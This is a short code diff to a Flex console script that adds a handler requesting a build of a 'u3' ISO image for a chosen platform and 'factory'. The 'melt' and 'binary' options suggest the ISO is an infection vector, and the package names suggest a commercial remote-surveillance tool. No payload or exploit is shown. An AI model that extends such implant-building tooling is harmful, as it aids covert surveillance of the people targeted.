@@ -6,10 +6,35 @@
   <fx:Script>
     <![CDATA[
       import it.ht.rcs.console.monitor.controller.LicenseManager;
+      import it.ht.rcs.console.task.controller.DownloadManager;
+      import it.ht.rcs.console.utils.AlertPopUp;
+      
+      import locale.R;
+      
+      import mx.core.UIComponent;
+      import mx.managers.PopUpManager;
+      import mx.rpc.events.FaultEvent;
+      import mx.rpc.events.ResultEvent;
+      
       protected function create(event:MouseEvent):void
       {
-        var params:Object = {platform: 'u3', generate: {platforms: ['windows'], binary: {demo: demo.selected}, melt: {admin: false} } }
+        var params:Object = {platform: 'u3', generate: {platforms: [parentDocument.platform], binary: {demo: demo.selected}, melt: {admin: false} } }
           
+        params['factory'] = {_id: parentDocument.factory._id};
+        
+        var filename:String = parentDocument.factory.name + '_u3.iso'
+        
+        DownloadManager.instance.createTask("build", filename, params, onSuccess, onFailure);
+      }
+      
+      private function onSuccess(e:ResultEvent):void
+      {
+        PopUpManager.removePopUp(((parentDocument as UIComponent).parentDocument).hostComponent);
+      }
+      
+      private function onFailure(e:FaultEvent):void
+      {
+        AlertPopUp.show(R.get('TASK_ALREADY_CREATED'));
       }
     ]]>
   </fx:Script>
